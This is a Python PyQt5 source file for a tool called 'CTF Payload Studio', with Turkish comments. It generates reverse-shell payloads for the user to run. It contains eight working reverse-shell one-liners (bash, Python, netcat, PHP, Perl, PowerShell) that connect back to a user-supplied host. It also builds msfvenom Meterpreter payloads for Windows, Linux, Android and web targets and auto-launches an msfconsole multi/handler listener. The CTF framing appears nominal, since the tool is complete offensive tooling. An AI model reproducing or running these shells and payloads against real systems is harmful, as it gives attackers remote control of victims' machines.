import sys
import os
import subprocess
import shutil
from datetime import datetime
from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QComboBox, QPushButton, QTextEdit,
                             QTabWidget, QGroupBox, QMessageBox, QFileDialog, QCheckBox)
from PyQt5.QtCore import Qt, QSize
from PyQt5.QtGui import QFont, QIcon, QColor, QPalette

# === AYARLAR VE SABİTLER ===
APP_NAME = "CTF Payload Studio"
VERSION = "3.0"
AUTHOR = "LordMs"

# Kabuk Şablonları (Quick Shells)
SHELL_TEMPLATES = {
    "Bash -i": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "Bash 196": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
    "Python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
    "Netcat (Traditional)": "nc -e /bin/sh {ip} {port}",
    "Netcat (OpenBSD)": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    "PHP Exec": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "Perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
    "Powershell": "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
}

# Payload Seçenekleri
PAYLOADS = {
    "Windows": {
        "Meterpreter Reverse TCP (x64)": "windows/x64/meterpreter/reverse_tcp",
        "Meterpreter Reverse TCP (x86)": "windows/meterpreter/reverse_tcp",
        "Shell Reverse TCP": "windows/shell_reverse_tcp"
    },
    "Linux": {
        "Meterpreter Reverse TCP (x64)": "linux/x64/meterpreter/reverse_tcp",
        "Shell Reverse TCP (x64)": "linux/x64/shell_reverse_tcp",
        "Shell Reverse TCP (x86)": "linux/x86/shell_reverse_tcp"
    },
    "Android": {
        "Meterpreter Reverse TCP": "android/meterpreter/reverse_tcp",
        "Embed Mettle": "android/meterpreter/reverse_tcp"
    },
    "Web": {
        "PHP Meterpreter": "php/meterpreter/reverse_tcp",
        "ASP Meterpreter": "windows/meterpreter/reverse_tcp",  # Genellikle windows kullanılır
        "JSP Shell": "java/jsp_shell_reverse_tcp"
    }
}

FORMATS = {
    "Windows": ["exe", "dll", "vba", "ps1"],
    "Linux": ["elf", "py", "sh"],
    "Android": ["apk"],
    "Web": ["raw", "php", "asp", "jsp", "war"]
}


class CTFStudio(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.check_dependencies()

    def initUI(self):
        self.setWindowTitle(f"{APP_NAME} v{VERSION} - by {AUTHOR}")
        self.setGeometry(100, 100, 900, 650)
        self.setStyleSheet(self.get_dark_theme())

        # Ana Widget ve Layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)

        # Başlık
        title_label = QLabel("⚡ CTF PAYLOAD STUDIO ⚡")
        title_label.setFont(QFont("Segoe UI", 18, QFont.Bold))
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: #00ff00; letter-spacing: 5px; margin-bottom: 10px;")
        main_layout.addWidget(title_label)

        # Sekmeler
        self.tabs = QTabWidget()
        self.tabs.addTab(self.create_quick_shells_tab(), "🚀 Quick Shells (One-Liners)")
        self.tabs.addTab(self.create_generator_tab(), "🛠️ Payload Generator (MsfVenom)")
        self.tabs.addTab(self.create_listener_tab(), "🎧 Listener (MsfConsole)")
        main_layout.addWidget(self.tabs)

        # Durum Çubuğu
        self.status_log = QTextEdit()
        self.status_log.setReadOnly(True)
        self.status_log.setMaximumHeight(100)
        self.status_log.setStyleSheet("background-color: #111; color: #00ff00; font-family: Consolas; font-size: 12px;")
        main_layout.addWidget(self.status_log)

        self.log("Sistem hazır. Hoş geldin, Ajan.")

    def create_quick_shells_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()

        # Girişler
        input_group = QGroupBox("Bağlantı Bilgileri")
        input_layout = QHBoxLayout()

        self.qs_ip = QLineEdit("10.10.X.X")
        self.qs_port = QLineEdit("4444")
        self.qs_type = QComboBox()
        self.qs_type.addItems(SHELL_TEMPLATES.keys())

        input_layout.addWidget(QLabel("LHOST:"))
        input_layout.addWidget(self.qs_ip)
        input_layout.addWidget(QLabel("LPORT:"))
        input_layout.addWidget(self.qs_port)
        input_layout.addWidget(QLabel("Shell Tipi:"))
        input_layout.addWidget(self.qs_type)

        input_group.setLayout(input_layout)
        layout.addWidget(input_group)

        # Çıktı Alanı
        self.qs_output = QTextEdit()
        self.qs_output.setStyleSheet("font-family: Consolas; font-size: 14px; color: #00ff00; background-color: #000;")
        layout.addWidget(self.qs_output)

        # Butonlar
        btn_layout = QHBoxLayout()
        btn_generate = QPushButton("Kodu Oluştur")
        btn_generate.clicked.connect(self.generate_quick_shell)
        btn_copy = QPushButton("Kopyala")
        btn_copy.clicked.connect(self.copy_quick_shell)

        btn_layout.addWidget(btn_generate)
        btn_layout.addWidget(btn_copy)
        layout.addLayout(btn_layout)

        tab.setLayout(layout)
        return tab

    def create_generator_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()

        # Ayarlar
        grid_layout = QHBoxLayout()

        # Sol Taraf: Platform ve Payload
        left_group = QGroupBox("Hedef Sistem")
        left_layout = QVBoxLayout()

        self.pg_platform = QComboBox()
        self.pg_platform.addItems(PAYLOADS.keys())
        self.pg_platform.currentTextChanged.connect(self.update_payloads_and_formats)

        self.pg_payload = QComboBox()

        self.pg_format = QComboBox()

        left_layout.addWidget(QLabel("Platform:"))
        left_layout.addWidget(self.pg_platform)
        left_layout.addWidget(QLabel("Payload:"))
        left_layout.addWidget(self.pg_payload)
        left_layout.addWidget(QLabel("Format:"))
        left_layout.addWidget(self.pg_format)
        left_group.setLayout(left_layout)

        # Sağ Taraf: Bağlantı
        right_group = QGroupBox("Bağlantı")
        right_layout = QVBoxLayout()

        self.pg_ip = QLineEdit("127.0.0.1")
        self.pg_port = QLineEdit("4444")
        self.pg_filename = QLineEdit("shell")

        right_layout.addWidget(QLabel("LHOST:"))
        right_layout.addWidget(self.pg_ip)
        right_layout.addWidget(QLabel("LPORT:"))
        right_layout.addWidget(self.pg_port)
        right_layout.addWidget(QLabel("Dosya Adı (Uzantısız):"))
        right_layout.addWidget(self.pg_filename)
        right_group.setLayout(right_layout)

        grid_layout.addWidget(left_group)
        grid_layout.addWidget(right_group)
        layout.addLayout(grid_layout)

        # Oluştur Butonu
        self.btn_create_payload = QPushButton("🚀 PAYLOAD OLUŞTUR (msfvenom)")
        self.btn_create_payload.setStyleSheet(
            "background-color: #b71c1c; color: white; font-weight: bold; padding: 10px;")
        self.btn_create_payload.clicked.connect(self.run_msfvenom)
        layout.addWidget(self.btn_create_payload)

        # Başlangıç Yüklemesi
        self.update_payloads_and_formats()

        tab.setLayout(layout)
        return tab

    def create_listener_tab(self):
        tab = QWidget()
        layout = QVBoxLayout()

        info_label = QLabel("Bu sekme, oluşturduğunuz payload için otomatik olarak msfconsole dinleyicisini başlatır.")
        info_label.setWordWrap(True)
        layout.addWidget(info_label)

        # Dinleyici Ayarları (Otomatik olarak Generator'dan çekilebilir ama manuel de girilsin)
        group = QGroupBox("Dinleyici Konfigürasyonu")
        form = QVBoxLayout()

        self.ls_ip = QLineEdit("0.0.0.0")
        self.ls_port = QLineEdit("4444")
        self.ls_payload = QLineEdit("windows/x64/meterpreter/reverse_tcp")

        form.addWidget(QLabel("LHOST (Dinleme Adresi):"))
        form.addWidget(self.ls_ip)
        form.addWidget(QLabel("LPORT:"))
        form.addWidget(self.ls_port)
        form.addWidget(QLabel("Payload:"))
        form.addWidget(self.ls_payload)

        group.setLayout(form)
        layout.addWidget(group)

        self.btn_start_listener = QPushButton("🎧 DİNLEYİCİYİ BAŞLAT (msfconsole)")
        self.btn_start_listener.setStyleSheet(
            "background-color: #1b5e20; color: white; font-weight: bold; padding: 15px;")
        self.btn_start_listener.clicked.connect(self.run_listener)
        layout.addWidget(self.btn_start_listener)

        layout.addStretch()
        tab.setLayout(layout)
        return tab

    # --- MANTIK FONKSİYONLARI ---

    def update_payloads_and_formats(self):
        platform = self.pg_platform.currentText()

        # Payloadları güncelle
        self.pg_payload.clear()
        self.pg_payload.addItems(PAYLOADS[platform].keys())

        # Formatları güncelle
        self.pg_format.clear()
        self.pg_format.addItems(FORMATS[platform])

    def generate_quick_shell(self):
        ip = self.qs_ip.text()
        port = self.qs_port.text()
        shell_type = self.qs_type.currentText()

        if not ip or not port:
            self.qs_output.setText("HATA: IP ve Port giriniz.")
            return

        template = SHELL_TEMPLATES[shell_type]
        code = template.format(ip=ip, port=port)
        self.qs_output.setText(code)
        self.log(f"Quick Shell oluşturuldu: {shell_type}")

    def copy_quick_shell(self):
        clipboard = QApplication.clipboard()
        clipboard.setText(self.qs_output.toPlainText())
        self.log("Kod panoya kopyalandı!")

    def run_msfvenom(self):
        if not shutil.which("msfvenom"):
            QMessageBox.critical(self, "Hata", "msfvenom sistemde bulunamadı!\nMetasploit yüklü mü?")
            return

        platform = self.pg_platform.currentText()
        payload_name = self.pg_payload.currentText()
        payload_code = PAYLOADS[platform][payload_name]
        fmt = self.pg_format.currentText()
        ip = self.pg_ip.text()
        port = self.pg_port.text()
        filename = self.pg_filename.text() + "." + fmt

        cmd = f"msfvenom -p {payload_code} LHOST={ip} LPORT={port} -f {fmt} -o {filename}"

        self.log(f"Komut Çalıştırılıyor: {cmd}")
        self.btn_create_payload.setEnabled(False)
        self.btn_create_payload.setText("Oluşturuluyor...")
        QApplication.processEvents()  # UI donmasın

        try:
            subprocess.run(cmd, shell=True, check=True)
            self.log(f"BAŞARILI: {filename} oluşturuldu.")
            QMessageBox.information(self, "Başarılı", f"Payload hazır:\n{os.getcwd()}/{filename}")

            # Dinleyici sekmesini otomatik güncelle
            self.ls_payload.setText(payload_code)
            self.ls_port.setText(port)

        except subprocess.CalledProcessError as e:
            self.log(f"HATA: msfvenom başarısız oldu. Kod: {e.returncode}")
            QMessageBox.critical(self, "Hata", "Payload oluşturulamadı. Konsol çıktısını kontrol edin.")

        self.btn_create_payload.setEnabled(True)
        self.btn_create_payload.setText("🚀 PAYLOAD OLUŞTUR (msfvenom)")

    def run_listener(self):
        if not shutil.which("msfconsole"):
            QMessageBox.critical(self, "Hata", "msfconsole sistemde bulunamadı!")
            return

        ip = self.ls_ip.text()
        port = self.ls_port.text()
        payload = self.ls_payload.text()

        # Kaynak dosyası oluştur
        rc_file = "listener.rc"
        with open(rc_file, "w") as f:
            f.write("use exploit/multi/handler\n")
            f.write(f"set PAYLOAD {payload}\n")
            f.write(f"set LHOST {ip}\n")
            f.write(f"set LPORT {port}\n")
            f.write("set ExitOnSession false\n")
            f.write("exploit -j\n")

        cmd = f"msfconsole -r {rc_file}"
        self.log(f"Dinleyici başlatılıyor: {cmd}")

        # Yeni terminalde aç (Linux için)
        try:
            # Farklı terminaller için deneme yap
            if shutil.which("gnome-terminal"):
                subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"{cmd}; exec bash"])
            elif shutil.which("xfce4-terminal"):
                subprocess.Popen(["xfce4-terminal", "-e", f"bash -c '{cmd}; exec bash'"])
            elif shutil.which("xterm"):
                subprocess.Popen(["xterm", "-e", cmd])
            else:
                # Terminal bulunamazsa mecburen bu pencerede çalıştır (bloklar)
                subprocess.run(cmd, shell=True)

        except Exception as e:
            self.log(f"Terminal hatası: {e}")

    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.status_log.append(f"[{timestamp}] {message}")

    def check_dependencies(self):
        missing = []
        if not shutil.which("msfvenom"): missing.append("msfvenom")
        if not shutil.which("msfconsole"): missing.append("msfconsole")

        if missing:
            self.log(f"UYARI: Şu araçlar eksik: {', '.join(missing)}. Program kısıtlı çalışacak.")
            self.status_log.append("Lütfen Metasploit Framework yükleyin.")

    def get_dark_theme(self):
        return """
        QMainWindow { background-color: #121212; color: #ffffff; }
        QWidget { background-color: #121212; color: #e0e0e0; font-family: 'Segoe UI'; font-size: 14px; }
        QGroupBox { border: 1px solid #333; border-radius: 5px; margin-top: 10px; font-weight: bold; color: #00e5ff; }
        QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 5px; }
        QLineEdit, QComboBox { background-color: #1e1e1e; border: 1px solid #333; padding: 5px; border-radius: 3px; color: #fff; }
        QLineEdit:focus, QComboBox:focus { border: 1px solid #00e5ff; }
        QPushButton { background-color: #333; border: none; padding: 8px; border-radius: 4px; color: white; }
        QPushButton:hover { background-color: #444; }
        QTabWidget::pane { border: 1px solid #333; }
        QTabBar::tab { background: #1e1e1e; color: #888; padding: 10px; }
        QTabBar::tab:selected { background: #333; color: #00e5ff; border-bottom: 2px solid #00e5ff; }
        QTextEdit { background-color: #000; border: 1px solid #333; color: #00ff00; }
        """


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = CTFStudio()
    window.show()
    sys.exit(app.exec_())